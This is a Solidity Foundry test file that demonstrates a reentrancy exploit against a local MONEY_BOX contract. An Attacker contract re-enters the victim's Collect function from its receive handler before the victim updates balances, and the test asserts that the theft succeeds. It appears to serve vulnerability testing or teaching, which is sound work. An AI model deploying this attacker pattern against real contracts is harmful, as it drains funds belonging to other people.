
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public moneyBox;
    Attacker public _attacker;

    function setUp() public {
        moneyBox = new MONEY_BOX();
        moneyBox.SetMinSum(1 ether);
        moneyBox.SetLogFile(address(new LogMock()));
        moneyBox.Initialized();

        _attacker = new Attacker(address(moneyBox));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether);
        vm.assume(attackVal < 10 ether);

        vm.deal(address(moneyBox), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // attacker must deposit at least MinSum and enough to pass Collect checks
        uint256 depositAmount = attackVal;
        if (depositAmount < 2 ether) {
            depositAmount = 2 ether;
        }
        vm.deal(address(_attacker), address(_attacker).balance + depositAmount);

        // warp so unlockTime condition can be satisfied later
        vm.warp(block.timestamp + 1 days);

        _attacker.setupAttack{value: depositAmount}(depositAmount);

        // ensure unlock time is in the past for Collect
        vm.warp(block.timestamp + 2 days);

        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = MONEY_BOX(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into MONEY_BOX via Put so that:
        // - balance >= MinSum
        // - balance >= val for Collect
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Trigger vulnerable Collect. This will send ETH to this contract
        // before updating victim.Acc[msg.sender].balance, enabling reentrancy.
        victim.Collect(val);

        // After Collect and re-entrancy complete, check if we gained more than val
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter with the same amount while victim's balance is not yet reduced
            victim.Collect(storedAttackVal);
        }
    }

    fallback() external payable {}
}

contract LogMock {
    function AddMessage(address, uint256, string memory) public {}

    receive() external payable {}

    fallback() external payable {}
}
